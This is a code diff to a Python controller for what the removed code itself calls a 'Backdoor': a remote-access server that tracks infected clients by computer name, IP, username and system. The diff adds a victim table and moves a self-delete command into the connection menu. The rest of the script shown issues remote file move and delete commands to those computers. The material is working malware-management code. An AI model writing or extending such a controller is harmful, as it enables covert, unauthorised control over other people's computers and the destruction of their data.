@@ -11,6 +11,9 @@ BUFFER = 8192
 clients = []
 clientInfo = []
 
+table = PrettyTable()
+table.field_names = ["ID", "Computer", "IP Address", "Username", "System", "File"]
+
 send = lambda data: client.send(bytes(data, "utf-8"))
 recv = lambda buffer: client.recv(BUFFER)
 
@@ -64,20 +67,20 @@ def RemoteConnect():
             RemoteConnect()
 
 def ConnectionCommands():
-    print("_____________________________________________")
-    print("(Connection Commands)                        |\n" + \
-          "                                             |")
-    print("[clients]       View Connected Clients       |")
-    print("[connect <id>]  Connect to Client            |")
-    print("[close <id>]    Terminate Connection         |")
-    print("[closeall]      Terminates All Connections   |")
-    print("_____________________________________________|")
+    print("______________________________________________________")
+    print("(Connection Commands)                                 |\n" + \
+          "                                                      |")
+    print("[clients]         View Connected Clients              |")
+    print("[connect <id>]    Connect to Client                   |")
+    print("[close <id>]      Terminate Connection                |")
+    print("[delete <id>]     Kill Connection & Delete Program    |")
+    print("[closeall]        Terminates All Connections          |")
+    print("______________________________________________________|")
 
 def ClientCommands():
     print("______________________________________")
     print("(Connection Commands)                 |\n" + \
           "                                      |")
-    print("[-tmc] Terminate Connection           |")
     print("[-apc] Append Connection              |")
     print("______________________________________|")
     print("(User Interface Commands)             |\n" + \
@@ -108,7 +111,6 @@ def ClientCommands():
     print("[-mvf] Move File                      |")
     print("[-dlf] Delete File                    |")
     print("[-dld] Delete Directory               |")
-    print("[-dls] Delete Self                    |")
     print("______________________________________|\n")
 
 def VBSMessageBox():
@@ -435,15 +437,21 @@ def DeleteDirectory():
 
     print(str(recv(BUFFER), "utf-8") + "\n")
 
-def DeleteSelf():
-    if not (input("Delete Backdoor off Client's Computer? (y/n): ").lower().strip() == "y"):
-        print(); return
+def adjustTable():
+    table.clear_rows()
 
-    send("delself")
-    if (str(recv(BUFFER), "utf-8") == "success"):
-        print(f"Backdoor has been removed off Remote Computer ~ [{IP_Address}]\n")
-        client.close()
-        exit(0)
+    for client in clients:
+        connection = int(clients.index(client))
+        network = client.getpeername()
+
+        table.add_row([
+            str(connection),
+            clientInfo[connection][1][0],
+            network[0] + ":" + str(network[1]),
+            clientInfo[connection][1][1],
+            clientInfo[connection][1][2],
+            clientInfo[connection][1][3]
+        ])
 
 def SelectConnection():
     while (True):
@@ -460,30 +468,27 @@ def SelectConnection():
                     print("<Connections Appear Here>")
                     continue
 
-                table = PrettyTable()
-                table.field_names = ["ID", "Computer", "IP Address", "Username", "System"]
-                empty = False
-
+                temp = []
                 for client in clients:
-                    connection = int(clients.index(client))
                     try:
                         client.send(b"test")
-                        if (client.recv(1024) == b"success"):
-                            table.add_row([
-                                str(connection),
-                                clientInfo[connection][1][0],
-                                client.getpeername()[0],
-                                clientInfo[connection][1][1],
-                                clientInfo[connection][1][2]
-                            ])
+                        if (client.recv(BUFFER) == b"success"):
+                            continue
 
                     except ConnectionResetError:
-                        del(clientInfo[connection])
-                        clients.remove(client)
-                        print(f"{client.getpeername()[0]} has Disconnected")
-                        empty = True
+                        temp.append(client)
 
-                if not empty:
+                for d_client in temp:
+                    dead = int(clients.index(d_client))
+
+                    if (d_client in clients):
+                        table.del_row(dead)
+                        clients.remove(d_client)
+                        del(clientInfo[dead])
+                        d_client.close()
+                
+                adjustTable()
+                if not (len([t for t in table]) == 0):
                     print(table)
 
             elif (command.split(" ")[0] == "connect"):
@@ -491,7 +496,7 @@ def SelectConnection():
                 client = clients[connection]
                 try:
                     client.send(b"test")
-                    if (client.recv(1024) == b"success"):
+                    if (client.recv(BUFFER) == b"success"):
                         RemoteControl(connection)
 
                 except ConnectionResetError:
@@ -513,20 +518,45 @@ def SelectConnection():
                     clients.remove(client)
                     client.close()
 
-            elif (command == "closeall"):
-                if (input("Are you sure? (y/n): ").lower() == "y"):
-                    for client in clients:
-                        client.send(b"terminate")
+            elif (command.split(" ")[0] == "delete"):
+                connection = int(command.split(" ")[1])
+                client = clients[connection]
+
+                if (input(f"Delete Program off Client {clients.index(client)}'s Computer? (y/n): ").lower().strip() == "y"):
+                    try:
+                        client.send(b"delself")
+                        if (str(client.recv(BUFFER), "utf-8") == "success"):
+                            print(f"Program has been Deleted off Remote Computer ~ [{client.getpeername()[0]}]")
+
+                    except ConnectionResetError:
+                        print("Lost Connection to Client: " + client.getpeername()[0])
+
+                    finally:
+                        del(clientInfo[connection])
+                        clients.remove(client)
                         client.close()
 
-                    print(f"Total Connections Terminated: [{len(clients)}]")
-                    clients.clear()
+            elif (command == "closeall"):
+                if (input("Are you sure? (y/n): ").lower() == "y"):
+                    try:
+                        for client in clients:
+                            client.send(b"terminate")
+                            client.close()
 
-        except IndexError:
+                    except ConnectionResetError: pass
+                    finally:
+                        print(f"All Connections Terminated: [{len(clients)}]")
+                        clients.clear()
+
+        except (ValueError, IndexError):
             print("Invalid Connection ID")
 
-        except ValueError:
-            print("Invalid Value, try again")
+        except ConnectionAbortedError:
+            print("[Clients Timed Out] - Reconnecting...")
+            for client in clients:
+                client.close()
+
+            clients.clear()
 
         except KeyboardInterrupt:
             break
@@ -544,7 +574,7 @@ def RemoteControl(connection):
     PC_Username = clientInfo[connection][1][1]
     PC_System = clientInfo[connection][1][2]
 
-    print(f"Connection Established: {PC_Name}/{IP_Address}\n")
+    print(f"Connection Established: {PC_Name}/{IP_Address} ({clients.index(client)})\n")
     while (True):
         try:
             command = input(f"({IP_Address})> ").lower().strip()
@@ -553,15 +583,6 @@ def RemoteControl(connection):
 
             elif (command == "?" or command == "help"):
                 ClientCommands()
-            
-            elif (command == "-tmc"):
-                client.send(b"terminate")
-                print(f"Terminated Connection ~ [{IP_Address} / {PC_Name}]")
-
-                del(clientInfo[connection])
-                clients.remove(client)
-                client.close()
-                break
                 
             elif (command == "-apc"):
                 print(f"Appended Connection ~ [{IP_Address}]")
@@ -627,9 +648,6 @@ def RemoteControl(connection):
             elif (command == "-dld"):
                 DeleteDirectory()
 
-            elif (command == "-dls"):
-                DeleteSelf()
-
         except KeyboardInterrupt:
             print("\n[Keyboard Interrupted ~ Connection Appended]")
             break
@@ -642,6 +660,7 @@ def RemoteControl(connection):
             print(f"\n[-] Lost Connection to ({IP_Address})\n" + f"Error Message: {e}")
             clients.remove(client)
             del(clientInfo[connection])
+            client.close()
             break
 
 t = threading.Thread(target=RemoteConnect)
